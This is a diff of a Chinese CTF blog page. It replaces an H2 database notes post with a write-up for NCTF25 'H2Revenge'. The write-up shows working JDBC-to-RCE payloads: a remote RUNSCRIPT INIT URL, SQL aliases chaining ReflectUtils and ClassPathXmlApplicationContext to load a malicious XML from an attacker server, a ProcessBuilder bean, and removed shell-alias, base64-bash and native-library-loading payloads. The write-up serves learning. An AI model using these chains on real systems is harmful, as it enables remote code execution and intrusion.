@@ -9,7 +9,7 @@
     
     <title>
         
-            h2sql |
+            NCTF25--H2Revenge |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        h2sql
+                        NCTF25--H2Revenge
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-05 20:10:09</span>
+                <span class="datetime">2025-05-06 19:40:14</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 20:10:29 GMT+0800">2025-05-05 20:10:29</span>
+                    <span class="datetime" data-updated="Tue May 06 2025 19:43:09 GMT+0800">2025-05-06 19:43:09</span>
                 </span>
             
         
@@ -281,7 +281,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                            <li class="category-item"><a href="/categories/CTF-Java/">CTF-Java</a></li>
                         
                     
                 </ul>
@@ -292,7 +292,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java/">CTF-Java</a></li>
                         
                     
                 </ul>
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>511 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>5 分钟</span>
             </span>
         
         
@@ -329,30 +329,39 @@
                     
 
                     
-                         <p>第一次用到是在ez_solon里面</p>
-<p>先简单给个EXP吧，之后再碰到再详细写</p>
-<p>找有getConnect的类，然后url这样写</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnpooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnpooledDataSource</span>(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/h2.sql&#x27;&quot;</span>, <span class="string">&quot;1diOt9&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;org.database.Driver&quot;</span>);</span><br></pre></td></tr></table></figure>
+                         <h1 id="思路确定"><a href="#思路确定" class="headerlink" title="思路确定"></a>思路确定</h1><p>题目是jdk17环境，先看依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.232<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>.sql文件有多种写法</p>
-<h1 id="Script引擎加载（jdk17失效）"><a href="#Script引擎加载（jdk17失效）" class="headerlink" title="Script引擎加载（jdk17失效）"></a>Script引擎加载（jdk17失效）</h1><p>一是直接用JavaScript引擎加载执行：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> test (</span><br><span class="line">     id <span class="type">INT</span> <span class="keyword">NOT NULL</span></span><br><span class="line"> );</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRIG_JS BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> TEST <span class="keyword">AS</span> <span class="string">&#x27;//javascript</span></span><br><span class="line"><span class="string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>分析一下可用资源：</p>
+<p>1、springboot自带的jackson链</p>
+<p>2、h2可以打JDBC，能够自定义函数执行，或者直接用JavaScript引擎加载(这个方法在jdk17失效)</p>
+<p>3、有tomcat，但是版本比较高，10.1.36，在jndi时也许能用</p>
+<p>再看一下题目：</p>
+<p>1、从Dockerfile里可以看到，是jre17，而不是jdk17。这意味着我们无法编译代码</p>
+<p>2、反序列化入口明显，且没有任何过滤</p>
+<p>3、MyDataSource存在getConnection方法，且连接的url可控</p>
+<p>综上，能够大概确定思路：</p>
+<p>1、jackson触发MyDataSource的getConnection，然后打h2数据库</p>
+<h1 id="h2-新打法"><a href="#h2-新打法" class="headerlink" title="h2 新打法"></a>h2 新打法</h1><p>一般来说，h2数据库要么用自定义函数执行，或者直接用JavaScript引擎加载。不过这两种这里都不能用。前者因为自定义的函数在jre环境下无法编译，后者是因为jdk17里JavaScript引擎被废除。因此我们需要找新的方法。</p>
+<p>如果做过其他jdk17打JDBC的题，就会发现：许多数据库都是可以直接调用Java的public static方法的。h2也不例外，这点可以去翻看官方文档<a class="link"   target="_blank" rel="noopener" href="https://h2database.com/html/features.html![img](image-1746531786413.png)" >https://h2database.com/html/features.html![img](image-1746531786413.png)<i class="fas fa-external-link-alt"></i></a></p>
+<p>或者去问AI验证一下：<img   src="/2025/05/03/JNI/25-H2Revenge/image-1746531786424.png"  alt="img"><img   src="/2025/05/03/JNI/25-H2Revenge/image-1746531786436.png"  alt="img"></p>
+<p>那么，我们现在就可以确定怎么打h2 JDBC了。不过我们还需要确定通过什么public static方法去打。</p>
+<p>看了wp，发现里面用的是org.springframework.cglib.core.ReflectUtils#newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])</p>
+<p>ReflectUtils是Springboot自带的一个很好用的类，里面还有defineClass。</p>
+<p>另外，值得一提的还有org.springframework.util.SerializationUtils#deserialize，这个可以用来二次反序列化。</p>
+<p>后面新学了一个rce的方法，就是加载xml。就是通过org.springframework.context.support.ClassPathXmlApplicationContext的构造方法加载恶意xml文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> solution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Tools17.bypassModule(ClassPathXml.class);</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>();</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(context.getClass().getName(), <span class="literal">false</span>, context.getClassLoader());</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(String.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredConstructor.newInstance(<span class="string">&quot;http://127.0.0.1:9990/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;pb&quot;</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> init-method=<span class="string">&quot;start&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;cmd&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;/c&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;calc&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
 
-<p>值得注意的是，这个方法在jdk17里会失效，因为Java17版本中JavaScript引擎(Nashorn)已经被删除。NCTF25的H2 Revenge就考了这个。</p>
-<h1 id="定义函数执行"><a href="#定义函数执行" class="headerlink" title="定义函数执行"></a>定义函数执行</h1><p>二是定义一个函数执行：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELL <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(<span class="keyword">null</span>);java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;<span class="keyword">CALL</span> SHELL(<span class="string">&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>直接在xml目录下起一个http服务就行。</p>
+<p>最后还需要编写一下poc.sql文件。这里也有一个注意点，先展示：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="keyword">FOR</span> <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="keyword">FOR</span> <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="keyword">FOR</span> <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_str</span><span class="operator">=</span><span class="string">&#x27;http://vps:port/h2_revenge_evil.xml&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_obj</span><span class="operator">=</span>UNESCAPE_VALUE(<span class="variable">@url_str</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@context_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@string_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> NEW_INSTANCE(<span class="variable">@context_clazz</span>, <span class="keyword">ARRAY</span>[<span class="variable">@string_clazz</span>], <span class="keyword">ARRAY</span>[<span class="variable">@url_obj</span>]);</span><br></pre></td></tr></table></figure>
 
-<p>值得注意的是如果只有jre而没有jdk，那么这个也会失效。因为这个方法需要jdk将函数编译后使用，如果只有jre就没办法编译了。</p>
-<h1 id="调用public-static-函数"><a href="#调用public-static-函数" class="headerlink" title="调用public static 函数"></a>调用public static 函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyDataSource</span> <span class="variable">myDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDataSource</span>(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;&quot;</span>, <span class="string">&quot;1diOt9&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">CREATE ALIAS CLASS_FOR_NAME FOR <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line">CREATE ALIAS NEW_INSTANCE FOR <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line">CREATE ALIAS UNESCAPE_VALUE FOR <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET <span class="meta">@url_str</span>=<span class="string">&#x27;http://vps:port/h2_revenge_evil.xml&#x27;</span>;</span><br><span class="line">SET <span class="meta">@url_obj</span>=UNESCAPE_VALUE(<span class="meta">@url_str</span>);</span><br><span class="line">SET <span class="meta">@context_clazz</span>=CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line">SET <span class="meta">@string_clazz</span>=CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line">CALL <span class="title function_">NEW_INSTANCE</span><span class="params">(<span class="meta">@context_clazz</span>, ARRAY[<span class="meta">@string_clazz</span>], ARRAY[<span class="meta">@url_obj</span>])</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Err0r233/article/details/146484415" >NCTF2024 Web方向题解-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p>CALL FILE_WRITE(X’自己的so的十六进制编码’, ‘&#x2F;tmp&#x2F;exp.so’);</p>
-<p>CREATE ALIAS IF NOT EXISTS System_load FOR “java.lang.System.load(java.lang.String)”;</p>
-<p>CALL System_load(‘&#x2F;tmp&#x2F;exp.so’);</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ArcherCY/p/17699288.html" >H2 database漏洞复现 - Running_J - 博客园<i class="fas fa-external-link-alt"></i></a></p>
-<p>[JavaSec&#x2F;9.JDBC Attack&#x2F;h2&#x2F;index.md at main · Y4tacker&#x2F;JavaSec](<a class="link"   target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;h2&#x2F;index.md)</p>
+<p>要注意的地方就是@url_str算varchar类型，而我们的newInstance里需要Object[]，所以需要找一个public static类，能够把String转为Object。（这里勘误一下，应该是Object转为String。因为最终需要的Object[]里面的内容是String，而现在需要将VERCHAR转为String。并且ARRAY[]只支持String。但是这样下面的查询语句就不对了，也就找不到wp里的那个类了，不知道有没有师傅知道应该怎么解释）用tabby找一下：<img   src="/2025/05/03/JNI/25-H2Revenge/image-1746531786457.png"  alt="img"></p>
+<p>搜出来的方法不是很多，排除掉没有exports的模块其实剩的就很少了。我们需要的javax.naming.ldap.Rdn.unescapeValue也在里面。</p>
+<h1 id="tabby找新类（失败）"><a href="#tabby找新类（失败）" class="headerlink" title="tabby找新类（失败）"></a>tabby找新类（失败）</h1><p>这里我发现org.springframework.scripting.bsh.BshScriptUtils#createBshObject应该也行，给的输入是”new java.lang.Object[]{&quot;<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/1.xml/%22%7D%22%E5%B0%B1%E8%A1%8C%E3%80%82%E7%84%B6%E8%80%8C%E8%BF%99%E4%B8%AA%E7%B1%BB%E6%9C%AC%E8%BA%AB%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E8%AF%B4%E6%98%AF%E5%8C%85%E6%B2%A1%E5%AF%BC%E5%85%A5%EF%BC%9A![img](image-1746531786459.png)" >http://127.0.0.1/1.xml\&quot;}&quot;就行。然而这个类本身有报错，说是包没导入：![img](image-1746531786459.png)<i class="fas fa-external-link-alt"></i></a></p>
+<p>我想既然spring里有这个类，那不应该自动下所需的包吗，不知道这里为什么。</p>
+<p>后面又去试了一下createBshObject，发现可能不行。虽然能返回Object[]，但是h2sql转化不了，会报类型转化错误，不知道有没有师傅可以解决。</p>
+<p>最后觉得应该是必须用 sql 语句自带的 ARRAY 转成 Object 数组，而不能直接传一个 Object[]。然后上面那个缺失包的情况，其实还挺常见的，就是在需要用时，自己把包导入。所以这题就没法用这个新找的链子了。自己找链子又失败了，悲。</p>
 
                     
                 </div>
@@ -363,11 +372,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                h2sql
+                NCTF25--H2Revenge
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/05/h2sql/
+                2025/05/06/NCTF25-H2Revenge/
             </div>
         </div>
 
@@ -383,7 +392,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-05 20:10</div>
+                <div class="content">2025-05-06 19:40</div>
             </div>
 
 
@@ -419,7 +428,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java/">CTF-Java</a>
                                     </li>
                                 
                             </ul>
@@ -435,31 +444,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/05/Derby/"
-                                   title="Derby"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Derby</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/05/postgreSQL/"
-                                   title="postgreSQL"
+                                   href="/2025/05/05/Derby/"
+                                   title="Derby"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">postgreSQL</span>
+                                        <span class="post-nav-title-item text-ellipsis">Derby</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -487,7 +480,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Script%E5%BC%95%E6%93%8E%E5%8A%A0%E8%BD%BD%EF%BC%88jdk17%E5%A4%B1%E6%95%88%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Script引擎加载（jdk17失效）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">定义函数执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8public-static-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">调用public static 函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E7%A1%AE%E5%AE%9A"><span class="nav-number">1.</span> <span class="nav-text">思路确定</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#h2-%E6%96%B0%E6%89%93%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">h2 新打法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tabby%E6%89%BE%E6%96%B0%E7%B1%BB%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">tabby找新类（失败）</span></a></li></ol>
     </div>
 </div>
 
@@ -677,7 +670,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Script%E5%BC%95%E6%93%8E%E5%8A%A0%E8%BD%BD%EF%BC%88jdk17%E5%A4%B1%E6%95%88%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Script引擎加载（jdk17失效）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">定义函数执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8public-static-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">调用public static 函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E7%A1%AE%E5%AE%9A"><span class="nav-number">1.</span> <span class="nav-text">思路确定</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#h2-%E6%96%B0%E6%89%93%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">h2 新打法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tabby%E6%89%BE%E6%96%B0%E7%B1%BB%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">tabby找新类（失败）</span></a></li></ol>
     </div>
 </div>
 
